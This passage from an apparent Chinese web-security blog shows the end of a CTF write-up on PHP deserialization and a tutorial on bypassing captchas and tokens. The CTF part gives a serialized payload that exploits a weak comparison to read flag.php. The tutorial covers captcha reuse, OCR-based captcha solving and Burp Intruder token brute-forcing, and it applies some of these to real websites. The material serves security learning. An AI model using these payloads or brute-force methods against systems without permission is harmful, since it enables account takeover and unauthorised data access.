class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断参数s是否有效</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 传递参数str，并判断str是否有效，如果有效就将其反序列化</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line">    <span class="variable">$str</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid(<span class="variable">$str</span>)) &#123;</span><br><span class="line">        <span class="variable">$obj</span> = unserialize(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查看代码可以看出来，GET方式传入序列化的str字符串，str字符串中每一个字符的ASCII范围在32到125之间，然后对其反序列化。</p><p>在反序列化的过程中，调用__destruct析构方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    <span class="keyword">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">  <span class="keyword">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="keyword">$this</span>``-&gt;process();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果op===”2”，将其赋为”1”，同时content赋为空，进入process函数，需要注意到的地方是，这里op与”2”比较的时候是强类型比较</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">    <span class="variable">$res</span> = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;output(<span class="variable">$res</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进入process函数后，如果op==”1”，则进入write函数，若op==”2”，则进入read函数，否则输出报错，可以看出来这里op与字符串的比较变成了弱类型比较==。</p><p>所以我们只要令op=2,这里的2是整数int。当op=2时，op===”2”为false，op==”2”为true，接着进入read函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">        <span class="variable">$res</span> = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>filename是我们可以控制的，接着使用file_get_contents函数读取文件，我们此处借助php://filter伪协议读取文件，获取到文件后使用output函数输出</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>于是构造payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$op</span>=<span class="string">&#x27; 2&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>=<span class="string">&#x27;xd&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$flag</span> = <span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="variable">$flag_1</span> = serialize(<span class="variable">$flag</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag_1</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出的序列化值：<code>O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;s:2:&quot; 2&quot;;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:2:&quot;xd&quot;;&#125;</code></p><p>传递参数，然后查看源代码，就能发现flag值</p><p><img src="/2022/03/23/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BPHP-JAVA%E5%85%A8%E8%A7%A3%EF%BC%88%E4%B8%8A%EF%BC%89/image17.png" alt="image17"></p></div><footer class="post-footer"><div class="post-eof"></div></footer></article><article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://www.zymstudy.club/2022/03/23/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E9%AA%8C%E8%AF%81%E7%A0%81-token-%E6%8E%A5%E5%8F%A3/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/Panda.jpg"><meta itemprop="name" content="zym"><meta itemprop="description" content="生活日常随笔"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="猪哥的博客"></span><header class="post-header"><h2 class="post-title" itemprop="name headline"><a href="/2022/03/23/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E9%AA%8C%E8%AF%81%E7%A0%81-token-%E6%8E%A5%E5%8F%A3/" class="post-title-link" itemprop="url">逻辑越权之验证码|token|接口</a></h2><div class="post-meta"><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar"></i> </span><span class="post-meta-item-text">发表于</span> <time title="创建时间：2022-03-23 09:59:55" itemprop="dateCreated datePublished" datetime="2022-03-23T09:59:55+08:00">2022-03-23</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar-check"></i> </span><span class="post-meta-item-text">更新于</span> <time title="修改时间：2022-03-24 20:05:30" itemprop="dateModified" datetime="2022-03-24T20:05:30+08:00">2022-03-24</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-folder"></i> </span><span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/web%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">web安全渗透学习</span></a> </span></span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-comment"></i> </span><span class="post-meta-item-text">Valine：</span> <a title="valine" href="/2022/03/23/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E9%AA%8C%E8%AF%81%E7%A0%81-token-%E6%8E%A5%E5%8F%A3/#valine-comments" itemprop="discussionUrl"><span class="post-comments-count valine-comment-count" data-xid="/2022/03/23/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E9%AA%8C%E8%AF%81%E7%A0%81-token-%E6%8E%A5%E5%8F%A3/" itemprop="commentCount"></span></a></span><br><span class="post-meta-item" title="本文字数"><span class="post-meta-item-icon"><i class="far fa-file-word"></i> </span><span class="post-meta-item-text">本文字数：</span> <span>3.8k</span> </span><span class="post-meta-item" title="阅读时长"><span class="post-meta-item-icon"><i class="far fa-clock"></i> </span><span class="post-meta-item-text">阅读时长 &asymp;</span> <span>3 分钟</span></span></div></header><div class="post-body" itemprop="articleBody"><h1 id="逻辑越权之验证码-token-接口"><a href="#逻辑越权之验证码-token-接口" class="headerlink" title="逻辑越权之验证码|token|接口"></a>逻辑越权之验证码|token|接口</h1><p><img src="/2022/03/23/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E9%AA%8C%E8%AF%81%E7%A0%81-token-%E6%8E%A5%E5%8F%A3/逻辑越权之验证码-token-接口/image1.webp" alt="image1"></p><h2 id="一-验证安全原理"><a href="#一-验证安全原理" class="headerlink" title="一.验证安全原理"></a>一.验证安全原理</h2><h3 id="1-验证码安全"><a href="#1-验证码安全" class="headerlink" title="1.验证码安全"></a>1.验证码安全</h3><p>分类：图片，手机或邮箱，语音，视频，操作等</p><p>原理：验证生成或验证过程中的逻辑问题</p><p>危害：账户权限泄漏，短信轰炸，遍历，任意用户操作等</p><p>漏洞：客户端回显(已讲)，验证码复用，验证码爆破(已讲)，绕过等</p><ul><li><p>验证码爆破：没有次数限制，验证码有效时间内不变</p></li><li><p>验证码识别：用工具识别验证码</p></li><li><p>复用：用上一次的验证码来绕过下一次的验证</p></li><li><p>回显：验证码在前端数据包显示</p></li><li><p>绕过：逻辑上的绕过，直接跳过验证码</p></li></ul><h3 id="2-token安全"><a href="#2-token安全" class="headerlink" title="2.token安全"></a>2.token安全</h3><p>基本上述同理，主要是验证中可存在绕过可继续后续测试</p><ul><li><p>token爆破：token后面会跟上一个字符串，如果知道规律可以进行爆破</p></li><li><p>token客户端回显：token的数据会在前端数据包（request）里面显示</p></li><li><p>token固定：虽然有token，但是可以通过上一次的token操作下一次的数据包（表面上有，实际没有）</p></li></ul><p><img src="/2022/03/23/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E9%AA%8C%E8%AF%81%E7%A0%81-token-%E6%8E%A5%E5%8F%A3/逻辑越权之验证码-token-接口/image2.webp" alt="image2"></p><h2 id="二-验证码识别插件及工具操作演示"><a href="#二-验证码识别插件及工具操作演示" class="headerlink" title="二.验证码识别插件及工具操作演示"></a>二.验证码识别插件及工具操作演示</h2><h3 id="1-Burpsuite安装验证码识别插件captcha-killer"><a href="#1-Burpsuite安装验证码识别插件captcha-killer" class="headerlink" title="1.Burpsuite安装验证码识别插件captcha-killer"></a>1.Burpsuite安装验证码识别插件captcha-killer</h3><p>插件下载地址：<a target="_blank" rel="noopener" href="https://github.com/c0ny1/captcha-killer/releases/tag/0.1.2">https://github.com/c0ny1/captcha-killer/releases/tag/0.1.2</a></p><p>下载对应的jar文件</p><p><img src="/2022/03/23/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E9%AA%8C%E8%AF%81%E7%A0%81-token-%E6%8E%A5%E5%8F%A3/逻辑越权之验证码-token-接口/image3.png" alt="image3"></p><p>extender导入下载好的jar文件</p><p><img src="/2022/03/23/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E9%AA%8C%E8%AF%81%E7%A0%81-token-%E6%8E%A5%E5%8F%A3/逻辑越权之验证码-token-接口/image4.png" alt="image4"></p><p>ok</p><p><img src="/2022/03/23/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E9%AA%8C%E8%AF%81%E7%A0%81-token-%E6%8E%A5%E5%8F%A3/逻辑越权之验证码-token-接口/image5.png" alt="image5"></p><h3 id="2-要识别的网站"><a href="#2-要识别的网站" class="headerlink" title="2.要识别的网站"></a>2.要识别的网站</h3><p><img src="/2022/03/23/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E9%AA%8C%E8%AF%81%E7%A0%81-token-%E6%8E%A5%E5%8F%A3/逻辑越权之验证码-token-接口/image6.png" alt="image6"></p><h3 id="3-浏览器抓包"><a href="#3-浏览器抓包" class="headerlink" title="3.浏览器抓包"></a>3.浏览器抓包</h3><p><img src="/2022/03/23/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E9%AA%8C%E8%AF%81%E7%A0%81-token-%E6%8E%A5%E5%8F%A3/逻辑越权之验证码-token-接口/image7.png" alt="image7"></p><p>进入请求面板，并点击获取</p><p><img src="/2022/03/23/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E9%AA%8C%E8%AF%81%E7%A0%81-token-%E6%8E%A5%E5%8F%A3/逻辑越权之验证码-token-接口/image8.png" alt="image8"></p><p>拿到验证码后，就要设置接口来进行识别了。可以使用网上免费的接口地址，访问并用burp抓包，发送到接口地址。</p><p>此处使用的是图鉴识别，地址：<a target="_blank" rel="noopener" href="http://www.ttshitu.com/">http://www.ttshitu.com/</a></p><p>接口URL:<a target="_blank" rel="noopener" href="http://api.ttshitu.com/">http://api.ttshitu.com:80</a></p><p>构造http请求模板如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /base64 HTTP/1.1</span><br><span class="line">Host: api.ttshitu.com</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: Hm_lvt_d92eb5418ecf5150abbfe0e505020254=1585994993,1586144399; SESSION=5ebf9c31-a424-44f8-8188-62ca56de7bdf; Hm_lpvt_d92eb5418ecf5150abbfe0e505020254=1586146123</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json; charset=UTF-8</span><br><span class="line">Content-Length: 2658</span><br><span class="line"></span><br><span class="line">&#123;&quot;username&quot;:&quot;*&quot;,&quot;password&quot;:&quot;*&quot;,&quot;typeid&quot;:&quot;1&quot;,&quot;image&quot;:&quot;&lt;@BASE64&gt;&lt;@IMG_RAW&gt;&lt;/@IMG_RAW&gt;&lt;/@BASE64&gt;&quot;&#125;</span><br></pre></td></tr></table></figure><p>username password填自己的账号密码，并右框填好匹配图形的正则表达式，<code>&lt;result&gt;(.*)&lt;/result&gt;</code></p><p>匹配成功！</p><p><img src="/2022/03/23/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E9%AA%8C%E8%AF%81%E7%A0%81-token-%E6%8E%A5%E5%8F%A3/逻辑越权之验证码-token-接口/image9.png" alt="image9"></p><h2 id="三-本地及实例"><a href="#三-本地及实例" class="headerlink" title="三.本地及实例"></a>三.本地及实例</h2><h3 id="1-进入服务端靶场（客户端验证）"><a href="#1-进入服务端靶场（客户端验证）" class="headerlink" title="1.进入服务端靶场（客户端验证）"></a>1.进入服务端靶场（客户端验证）</h3><p>输入不正确的用户和正确的验证码（提示用户名/密码不存在）</p><p><img src="/2022/03/23/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E9%AA%8C%E8%AF%81%E7%A0%81-token-%E6%8E%A5%E5%8F%A3/逻辑越权之验证码-token-接口/image10.png" alt="image10"></p><p>输入正确的用户名和错误的验证码（说明这里有验证码检测）</p><p><strong>思路：</strong>复用之前的验证码绕过（判断对方服务器有没有每次刷新验证码并且每个数据包的检验，或者看它是不是只检测了第一步），如果第一个数据包是对的，后面的还会不会检测</p><p><img src="/2022/03/23/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E9%AA%8C%E8%AF%81%E7%A0%81-token-%E6%8E%A5%E5%8F%A3/逻辑越权之验证码-token-接口/image11.png" alt="image11"></p><h3 id="2-抓取一个不正确的用户和正确的验证码的数据包"><a href="#2-抓取一个不正确的用户和正确的验证码的数据包" class="headerlink" title="2.抓取一个不正确的用户和正确的验证码的数据包"></a>2.抓取一个不正确的用户和正确的验证码的数据包</h3><p><img src="/2022/03/23/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E9%AA%8C%E8%AF%81%E7%A0%81-token-%E6%8E%A5%E5%8F%A3/逻辑越权之验证码-token-接口/image12.png" alt="image12"></p><p>查看返回数据包（说明验证码正确）</p><p><img src="/2022/03/23/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E9%AA%8C%E8%AF%81%E7%A0%81-token-%E6%8E%A5%E5%8F%A3/逻辑越权之验证码-token-接口/image13.png" alt="image13"></p><p>修改用户名但是不修改验证码（任然没有提升验证码错误，说明可以复用）</p><p><img src="/2022/03/23/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E9%AA%8C%E8%AF%81%E7%A0%81-token-%E6%8E%A5%E5%8F%A3/逻辑越权之验证码-token-接口/image14.png" alt="image14"></p><p>输入正确的用户名和密码，用之前的验证码，发现登陆成功！</p><p><strong>用法：</strong>首次输入验证码之后，就不用输入验证码，因此可以用字典对密码和用户名进行爆破</p><p><img src="/2022/03/23/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E9%AA%8C%E8%AF%81%E7%A0%81-token-%E6%8E%A5%E5%8F%A3/逻辑越权之验证码-token-接口/image15.png" alt="image15"></p><h3 id="3-客户端验证源代码分析"><a href="#3-客户端验证源代码分析" class="headerlink" title="3.客户端验证源代码分析"></a>3.客户端验证源代码分析</h3><p>可以直接在浏览器看到验证的源码</p><p><img src="/2022/03/23/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E9%AA%8C%E8%AF%81%E7%A0%81-token-%E6%8E%A5%E5%8F%A3/逻辑越权之验证码-token-接口/image16.png" alt="image16"></p><p><strong>注：</strong>当然在前端也可以这样写：将验证码部分写在1.js模块，然后&lt;script src=”1.js”,然后引用这个模块。因此很可能在前端里面看不到验证代码，所以我们在抓包的时候要查看是否调用了其他的地址</p><p>例如，我此处把前端源码中的验证代码copy到一个1.js文件中</p><p><img src="/2022/03/23/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E9%AA%8C%E8%AF%81%E7%A0%81-token-%E6%8E%A5%E5%8F%A3/逻辑越权之验证码-token-接口/image17.png" alt="image17"></p><p>然后在源代码中包含这个js文件</p><p><img src="/2022/03/23/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E9%AA%8C%E8%AF%81%E7%A0%81-token-%E6%8E%A5%E5%8F%A3/逻辑越权之验证码-token-接口/image18.png" alt="image18"></p><p>进入靶场，会发现调用这个js文件来进行验证</p><p><img src="/2022/03/23/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E9%AA%8C%E8%AF%81%E7%A0%81-token-%E6%8E%A5%E5%8F%A3/逻辑越权之验证码-token-接口/image19.png" alt="image19"></p><p>调用js来验证的话我们就可以禁用js文件来绕过</p><h3 id="4-服务端验证源码分析"><a href="#4-服务端验证源码分析" class="headerlink" title="4.服务端验证源码分析"></a>4.服务端验证源码分析</h3><ul><li><p>传递的参数都不能为空</p></li><li><p>post提交的验证码也要和session中的vcode相等</p></li><li><p>漏洞存在原因：session中的vcode没有销毁，导致下一次还能用</p></li></ul><p><img src="/2022/03/23/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E9%AA%8C%E8%AF%81%E7%A0%81-token-%E6%8E%A5%E5%8F%A3/逻辑越权之验证码-token-接口/image20.png" alt="image20"></p><h3 id="5-真实网站复用爆破"><a href="#5-真实网站复用爆破" class="headerlink" title="5.真实网站复用爆破"></a>5.真实网站复用爆破</h3><ul><li><p>输入手机号，图像验证码，获得手机验证码</p></li><li><p>数据包：code，mobile，count_code</p></li><li><p>抓取传送的回显数据包=》发送成功，请注意查收</p></li><li><p>爆破绕过验证码的方法：验证码的复用，只需要发送第一次验证码，然后可以通过数据包爆破密码</p></li></ul><h2 id="四-Token客户端回显绕过登录爆破演示——本地"><a href="#四-Token客户端回显绕过登录爆破演示——本地" class="headerlink" title="四.Token客户端回显绕过登录爆破演示——本地"></a>四.Token客户端回显绕过登录爆破演示——本地</h2><h3 id="1-进入pikachu靶场"><a href="#1-进入pikachu靶场" class="headerlink" title="1.进入pikachu靶场"></a>1.进入pikachu靶场</h3><p>什么是token（例如：在下订单的时候，使用token会防止重复下订单）</p><ul><li>Token的引入：Token是在客户端频繁向服务端请求数据，服务端频繁的去数据库查询用户名和密码并进行对比，判断用户名和密码正确与否，并作出相应提示，在这样的背景下，Token便应运而生。</li><li>Token的定义：Token是服务端生成的一串字符串，以作客户端进行请求的一个令牌，当第一次登录后，服务器生成一个Token便将此Token返回给客户端，以后客户端只需带上这个Token前来请求数据即可，无需再次带上用户名和密码。</li><li>使用Token的目的：Token的目的是为了减轻服务器的压力，减少频繁的查询数据库，使服务器更加健壮。</li></ul><h3 id="2-随意输入密码和用户名，查看前端token"><a href="#2-随意输入密码和用户名，查看前端token" class="headerlink" title="2.随意输入密码和用户名，查看前端token"></a>2.随意输入密码和用户名，查看前端token</h3><p><img src="/2022/03/23/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E9%AA%8C%E8%AF%81%E7%A0%81-token-%E6%8E%A5%E5%8F%A3/逻辑越权之验证码-token-接口/image21.png" alt="image21"></p><p>burp抓包（发现token和前端的token是一致的）</p><p><img src="/2022/03/23/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E9%AA%8C%E8%AF%81%E7%A0%81-token-%E6%8E%A5%E5%8F%A3/逻辑越权之验证码-token-接口/image22.png" alt="image22"></p><h3 id="3-源代码分析"><a href="#3-源代码分析" class="headerlink" title="3.源代码分析"></a>3.源代码分析</h3><p>post的数据不为空</p><p><img src="/2022/03/23/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E9%AA%8C%E8%AF%81%E7%A0%81-token-%E6%8E%A5%E5%8F%A3/逻辑越权之验证码-token-接口/image23.png" alt="image23"></p><p>判断传参的token是否相等</p><p><img src="/2022/03/23/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E9%AA%8C%E8%AF%81%E7%A0%81-token-%E6%8E%A5%E5%8F%A3/逻辑越权之验证码-token-接口/image24.png" alt="image24"></p><p>$_SEESION[‘token’]很显然是加载页面时产生的，$_POST[‘token’]，从上面抓到的token值与页面下看到的值相等，即$_POST[‘token’]=$_SEESION[‘token’]</p><p><img src="/2022/03/23/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E9%AA%8C%E8%AF%81%E7%A0%81-token-%E6%8E%A5%E5%8F%A3/逻辑越权之验证码-token-接口/image25.png" alt="image25"></p><ul><li><p>token是用来防爆破的，但是其token值输出在了前端源码中，容易被获取，因此也就失去了防暴力破解的意义。</p></li><li><p>只需要将它输出到前端的值写入字典中，并发数设置为1，每次获取一个token就进行一次尝试。</p></li><li><p>先随意输入账号密码，这里输入（admin/222）然后将其发送到Intruder中</p></li><li><p>因为token值用一次换一次，故模块选择Pitchfork</p></li></ul><p><img src="/2022/03/23/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E9%AA%8C%E8%AF%81%E7%A0%81-token-%E6%8E%A5%E5%8F%A3/逻辑越权之验证码-token-接口/image26.png" alt="image26"></p><p>密码和token设置为变量</p><p><img src="/2022/03/23/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E9%AA%8C%E8%AF%81%E7%A0%81-token-%E6%8E%A5%E5%8F%A3/逻辑越权之验证码-token-接口/image27.png" alt="image27"></p><p><strong>grep extract匹配的用法</strong></p><p><img src="/2022/03/23/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E9%AA%8C%E8%AF%81%E7%A0%81-token-%E6%8E%A5%E5%8F%A3/逻辑越权之验证码-token-接口/image28.png" alt="image28"></p><p>匹配前端的token值</p><p><img src="/2022/03/23/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E9%AA%8C%E8%AF%81%E7%A0%81-token-%E6%8E%A5%E5%8F%A3/逻辑越权之验证码-token-接口/image29.png" alt="image29"></p><p><strong>request engine用法</strong></p><p><img src="/2022/03/23/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E9%AA%8C%E8%AF%81%E7%A0%81-token-%E6%8E%A5%E5%8F%A3/逻辑越权之验证码-token-接口/image30.png" alt="image30"></p><p>对于变量1即密码，跑字典</p><p><img src="/2022/03/23/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E9%AA%8C%E8%AF%81%E7%A0%81-token-%E6%8E%A5%E5%8F%A3/逻辑越权之验证码-token-接口/image31.png" alt="image31"></p><p>对于变量2即token，抓取前端的token（这里后端生成的token会在前端回显）</p><p><img src="/2022/03/23/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E9%AA%8C%E8%AF%81%E7%A0%81-token-%E6%8E%A5%E5%8F%A3/Users\朱易明\AppData\Roaming\Typora\typora-user-images\image-20220323191314967.png" alt="image-20220323191314967"></p><p>设置字典</p><p><img src="/2022/03/23/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E9%AA%8C%E8%AF%81%E7%A0%81-token-%E6%8E%A5%E5%8F%A3/Users\朱易明\AppData\Roaming\Typora\typora-user-images\image-20220323191430273.png" alt="image-20220323191430273"></p><p>攻击</p><p><img src="/2022/03/23/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E9%AA%8C%E8%AF%81%E7%A0%81-token-%E6%8E%A5%E5%8F%A3/逻辑越权之验证码-token-接口/image32.png" alt="image32"></p><h3 id="4-总结"><a href="#4-总结" class="headerlink" title="4.总结"></a>4.总结</h3><p><img src="/2022/03/23/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E9%AA%8C%E8%AF%81%E7%A0%81-token-%E6%8E%A5%E5%8F%A3/逻辑越权之验证码-token-接口/image33.webp" alt="image33"></p><h2 id="五-某url下载接口id值调用遍历测试——实例"><a href="#五-某url下载接口id值调用遍历测试——实例" class="headerlink" title="五.某url下载接口id值调用遍历测试——实例"></a>五.某url下载接口id值调用遍历测试——实例</h2><h3 id="1-接口url：http-www-grasp-com-cn-DownFiles-aspx-id-，抓取数据包"><a href="#1-接口url：http-www-grasp-com-cn-DownFiles-aspx-id-，抓取数据包" class="headerlink" title="1.接口url：http://www.grasp.com.cn/DownFiles.aspx?id=，抓取数据包"></a>1.接口url：<a target="_blank" 